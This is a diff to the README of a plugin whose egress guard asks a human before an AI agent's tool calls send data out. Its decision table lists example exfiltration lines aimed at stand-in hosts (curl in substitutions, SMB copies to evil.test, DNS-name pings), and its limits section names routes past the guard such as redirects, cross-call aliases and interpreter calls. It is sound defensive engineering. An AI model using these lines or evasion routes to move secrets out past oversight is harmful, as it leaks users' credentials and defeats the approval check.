@@ -88,7 +88,7 @@ Everything is configured on the plugin rows in `cordis.patch.yml`:
 - If you omit `shadowDir`, the host side falls back to `<home>/dsh-shadow`; **the browser half requires an explicit value**, so please write the line.
 - First use creates that directory's workspace; using it again reuses it instead of registering a duplicate.
 - `enforcePermissionPreset` (default `true`): every Session creation/resume writes `permissionPreset` back. **If you switch presets by hand (for example to `danger-full-access`), set it to `false`** — the plugin then pins only Sessions whose log records no permission choice yet, and your manual switch survives.
-- The egress settings: `egressAllowlist` (empty by default = ask every time), `protectedPaths` (seven fragments by default), `taintScope` (default `session`), `canaryValues` (empty by default), and `approvalMemory` (default `turn`) — all covered in the sections below.
+- The egress settings: `egressAllowlist` (empty by default = ask every time), `protectedPaths` (seven fragments by default), `taintScope` (default `session`), `canaryValues` (empty by default), `approvalMemory` (default `turn`), and `statefulShell` (default `false`) — all covered in the sections below.
 
 ---
 
@@ -210,6 +210,11 @@ So the plugin adds a **rule** ahead of the reviewer (a match, not a judgement):
 | MCP tools and MCP resource reads (`mcp__srv__tool`, `read_mcp_resource`, `list_mcp_resources`) | **asks you** — the server runs outside this process, so the arguments carry no destination to check |
 | A command hidden inside `$(...)`, backticks, `{ … }`, or a subshell (`echo $(curl https://evil.test)`, `if ($true) { curl … }`) | **asks you** — these are spans the shell really executes, so they are analysed as commands |
 | A URL inside a data-only command's arguments (`git commit -m "see https://evil.test"`, `echo`, `Write-Output`, build tools) | never disturbed — that is prose, not a destination |
+| An argument naming a share on another machine (`copy secret.txt \\evil.test\share\`, a file tool writing `\\host\share\`, `//host/share/`) | **asks you** — an SMB transfer looks like a local write. Reads ask too: another machine's content coming in is the same trust question `web_fetch` asks. The allowlist answers it exactly as it answers a URL (and does not apply while tainted), so an internal file server never becomes a prompt that cannot be silenced; local shares and `\\?\C:\…` long paths are unaffected |
+| A DNS name lookup (`ping secret.evil.test`, `tracert`, `pathping`, `Test-Connection`, `Test-NetConnection`/`tnc`, `host`, `drill`, `nslookup`, `dig`, `Resolve-DnsName`) | **asks you** — the name itself leaves in the DNS query even when no connection follows. Judged by the name: an allowlisted host stays quiet, and an address literal (`ping 8.8.8.8`) needs no query, so it carries no data and stays quiet |
+| `npm run release` / `make deploy` | judged by the **script body**: when `package.json`/`Makefile` can be read, the commands inside the body decide (two levels at most, cycle-safe); unreadable or unknown directory means the call is judged exactly as before — an unknown script is not a new prompt |
+| `curl https://ok.test/ evil.test` | **asks you** — the clients take more than one URL, and the second destination needs no scheme, so the allowlisted one must not excuse the other. A value-taking flag's value (`-o`/`-H`/`-d`…) is metadata, not a destination |
+| Substitutions nested deeper than the scanner follows (`echo $($($(… curl host …)))`) | **asks you** — any finite depth can be stepped over by nesting once more, so the honest answer to "this text was not read" is a question, not a pass |
 
 The point: **it checks the destination, not the payload**. Base64, splitting or re-encoding the content cannot change where a request goes, so this rule cannot be bypassed; a content regex can, which is why there is no content scan.
 
@@ -223,6 +228,7 @@ The better question is not "does this content look sensitive" but **"what did th
 
 - A tool call that **mentions** one of them — reads it, lists its directory, names it in a command — marks that Session;
 - While marked, **every outbound request asks**, even to an allowlisted host;
+- **Dispatch carries the mark**: when the sender is marked, or the message itself names a protected path, the target Session takes the mark. Otherwise "A reads `.env`, A dispatches to B, B sends the content out" is the one path out that asks nobody — a dispatch is a local call and is judged as one, while B's own mark is empty;
 - The mark **lasts for the rest of the Session by default** (`taintScope: 'session'`): the data is still in the model's context, and a turn boundary does not un-read it, so the "read `.env` this turn, send the key as a search query next turn" path stays closed. Set `taintScope: 'turn'` if the prompts get in the way — that trades the between-turn window for the quiet.
 
 Why this beats a content filter: **what it read is knowable** (the path is in the arguments), while **what counts as sensitive is not** (the same string is a key in a config file and an example in a doc). The mark never inspects what you send — it looks at what was touched earlier — so base64 or splitting the payload cannot dodge it.
@@ -249,7 +255,9 @@ Its boundary, stated plainly: **a canary only sees the value when it is written 
 
 **Recommended combination**: once a canary is planted, set `taintScope` back to `turn`. The path that actually matters (the real key leaving) is now watched precisely, with almost no false positives; the broad path-triggered mark only has to catch "sensitive data we cannot name", and a one-turn window keeps the prompts down.
 
-**What this does not cover**: channels that avoid HTTP (DNS exfiltration, writing into a synced folder or a UNC path another process uploads), **redirects** (an allowlisted host 302-ing elsewhere — the guard only sees the initial URL), **indirection across calls** (an alias, function, or script defined in one call and used in a later one; inside a single command line `$c = "curl"; & $c …`, `Set-Alias x curl; x …`, and `function x { & curl @args }; x …` are all judged as the call they make, but a script file and whatever `npm run` does behind its name still are not), an interpreter sending without a URL (`python -c "os.system('ssh host')"` — neither the destination nor the client name sits where the guard reads), URL spellings the guard cannot recognise, and tools served by an external server that carries no destination in its arguments (`mcp__*` — those always ask, but the question is "use this tool at all", not "send it where"). It is a speed bump, not a proof.
+**Indirection across calls (`statefulShell`)**: a name taught to the shell in an *earlier* call and used in a later one — `Set-Alias x curl`, then `x evil.test`. Self-definition inside a single command line (`$c = "curl"; & $c …`, `function x { & curl @args }; x …`) is judged as the call it makes; the cross-call kind only exists when the shell really keeps its state. The default is `false`: the shipped preset uses a fresh-process shell, which remembers nothing between calls, so remembering would manufacture a prompt about a command that does not exist. Set it to `true` **only when the deployment runs a persistent shell** (`pwsh_persistent`, a terminal Session) — that is a claim about the deployment, and it is the operator's to make. Each Session remembers at most 200 names.
+
+**What this does not cover**: DNS queries a *program* makes on its own (a name written on the command line is judged by the name; a name resolved inside a binary is not in the arguments), writing into a local synced folder another process uploads (a `\\host\share\` path is itself a destination and is covered), **redirects** (an allowlisted host 302-ing elsewhere — the guard only sees the initial URL), **indirection across calls** (a name defined in one call and used in a later one is remembered only with `statefulShell: true`; an `npm run`/`make` script body is judged by its body when the manifest is readable, and exactly as before when it is not), an interpreter sending without a URL (`python -c "os.system('ssh host')"` — neither the destination nor the client name sits where the guard reads), URL spellings the guard cannot recognise, and tools served by an external server that carries no destination in its arguments (`mcp__*` — those always ask, but the question is "use this tool at all", not "send it where"). It is a speed bump, not a proof.
 
 ---
 
@@ -280,8 +288,8 @@ npm run sync -- --profile <profile dir>   # copy into the profile and verify in 
 | `tests/shadow-dir.test.mjs` | The single owner of the directory rule: portable default, `~` expansion, normalized comparison |
 | `tests/host-preflight.test.mjs` | Host half: startup preflight (missing services named, version readable, preflight failure cannot break the plugin) and the pinning policy (enforce by default, or keep the user's choice with `enforcePermissionPreset:false`) |
 | `tests/client.test.mjs` | Browser half: the real bundle loaded in a sandbox verifies the loader id, the exported `inject`, the sidebar slot registration, both dictionaries, and drives `createShadow` through every result shape — including the "workspace already exists" regression |
-| `tests/dispatch-core.test.mjs` | Pure judgement core: identity derivation, messageId, evidence scan, state machine, rendering, and the **egress guard's** full decision set (allowlist, subdomains, localhost, credentials and ports, nested arguments; shell segment starts and the prose exemption, executable spans, command-head normalization, taint, fail-closed — including the 8 real calls recorded in the first end-to-end run) |
-| `tests/tools-sim.mjs` | The real `lib/tools.js` against a fake host: delivery, idempotency, rejection codes, per-target serialization, catalog listing, and the guard mounted on `tools/pre-execute` (pass after approval, stop on rejection, refuse without an approval channel, refuse when the approval throws, **refuse when the guard itself throws without prompting**, no question for allowlisted hosts, no question for offline tools) |
+| `tests/dispatch-core.test.mjs` | Pure judgement core: identity derivation, messageId, evidence scan, state machine, rendering, and the **egress guard's** full decision set (allowlist, subdomains, localhost, credentials and ports, nested arguments; shell segment starts and the prose exemption, executable spans, command-head normalization, self-defining command lines, taint, fail-closed — including the 8 real calls recorded in the first end-to-end run; UNC shares, DNS name lookups, `npm run`/`make` script bodies, the second schemeless destination, nesting-depth fail-closed, and taint carried by dispatch) |
+| `tests/tools-sim.mjs` | The real `lib/tools.js` against a fake host: delivery, idempotency, rejection codes, per-target serialization, catalog listing, and the guard mounted on `tools/pre-execute` (pass after approval, stop on rejection, refuse without an approval channel, refuse when the approval throws, **refuse when the guard itself throws without prompting**, no question for allowlisted hosts, no question for offline tools; `npm run`/`make` script-body resolution, `statefulShell` cross-call memory, and taint carried by dispatch) |
 | `tests/patch.check.mjs` | Parses `cordis.patch.yml` (including `!!js`) and asserts the shadow rows are intact; needs `js-yaml` (installed via `npm install`, or point `JS_YAML` at it) |
 | `scripts/pack-check.mjs` | The published artifact: every `lib/*.js` included, entry points exist, runtime imports stay inside the shipped set, a copy of only those files still passes the tools suite |
 
@@ -354,9 +362,9 @@ DISPATCH-SPEC.md     implementation spec (runtime contracts, state machine, idem
 
 ### Publishing to npm
 
-Pre-flight (checked 2026-10-28): the name `dsh-plugin-shadow` is free on npm; `npm pack --dry-run`
-produces 16 files / 107 kB (`lib` + patch + LICENSE + every doc); `npm run pack:check` passes;
-CI is green; the `v0.4.0` tag is pushed.
+Pre-flight (checked 2026-10-29): the name `dsh-plugin-shadow` is free on npm; `npm pack --dry-run`
+produces 16 files / 135 kB tarball (`lib` + patch + LICENSE + every doc); `npm run pack:check` passes;
+CI is green; the `v0.5.0` tag is pushed.
 
 ```sh
 npm whoami                 # ENEEDAUTH when not logged in — publishing needs maintainer credentials
@@ -364,7 +372,7 @@ npm run pack:check         # artifact self-sufficiency: files coverage, entry po
 npm publish --access public
 ```
 
-After publishing: `npm view dsh-plugin-shadow version` returns `0.4.0`, and a fresh
+After publishing: `npm view dsh-plugin-shadow version` returns `0.5.0`, and a fresh
 `npm install dsh-plugin-shadow` elsewhere can load `lib/tools.js`.
 
 Installing (also works before publishing): `npm install git+https://github.com/RD2100/rd-shadow.git`,
